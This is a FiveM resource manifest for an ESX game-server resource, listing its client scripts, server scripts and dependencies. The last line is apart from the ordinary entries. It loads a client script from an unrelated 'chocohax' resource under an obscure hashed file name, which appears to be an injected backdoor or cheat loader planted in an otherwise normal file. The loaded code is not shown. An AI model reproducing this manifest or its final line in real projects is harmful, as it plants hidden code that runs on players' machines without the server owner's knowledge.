resource_manifest_version "44febabe-d386-4d18-afbe-5e627f4af937"

client_scripts {
  '@es_extended/locale.lua',
  'locales/en.lua',
  'config.lua',
  'client/main.lua'
}

server_scripts {
  '@mysql-async/lib/MySQL.lua',
  'server/main.lua'
}

dependencies {
	'es_extended'
}

client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'